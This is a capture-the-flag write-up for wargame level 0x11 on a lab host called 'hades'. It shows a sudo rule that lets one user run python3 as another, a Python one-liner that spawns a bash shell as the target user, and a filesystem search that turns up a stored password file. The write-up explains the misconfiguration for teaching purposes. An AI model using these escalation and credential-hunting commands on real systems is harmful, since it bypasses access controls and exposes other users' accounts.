# 0x11

moving from `asia` to `asteria`

---

The mission for this stage introduced user **asteria** and her interest in Python programming:

```bash
asia@hades:~$ cat mission.txt 
################
# MISSION 0x11 #
################

## EN ##        
The user asteria is teaching us to program in python. 
```

### The Solution: Python Interpreter Breakout

Upon checking the available `sudo` privileges, I found that the current user `asia` was permitted to run the Python 3 interpreter as user `asteria` without a password.

```bash
asia@hades:~$ sudo -l
...
User asia may run the following commands on hades:
    (asteria) NOPASSWD: /usr/bin/python3
```

By leveraging Python's `os` module, I could execute a system call to spawn a shell. Since the interpreter was running under Asteria's context via `sudo`, the resulting shell inherited her privileges.

```bash
asia@hades:~$ sudo -u asteria python3 -c 'import os; os.execl("/bin/bash", "bash")'
asteria@hades:/pwned/asia$ id
uid=2003(asteria) gid=2003(asteria) groups=2003(asteria)
```

### Finding the Password:

After obtaining the privileged shell, I searched the filesystem for any files containing "asteria" to find the cleartext login password.

```bash
asteria@hades:~$ find / -name "*asteria*" 2>/dev/null
/usr/share/doc/asteria_pass.txt

asteria@hades:~$ cat /usr/share/doc/asteria_pass.txt 
[REDACTED]
```

### Explanation:

* **Sudo Misconfiguration**: Allowing a user to run an interactive interpreter like Python via `sudo` is a major security risk. It allows the user to execute any arbitrary code with the target user's permissions.
* **`os.execl`**: This function in Python replaces the current process (the Python interpreter) with a new one (in this case, `/bin/bash`). Because `sudo` was used, the identity of the process owner remains the target user (**asteria**).
* **GTFOBins**: This is a classic example of using a legitimate binary to bypass local security restrictions and escalate privileges.

### Execution:

I successfully transitioned to user `asteria` and identified her password.
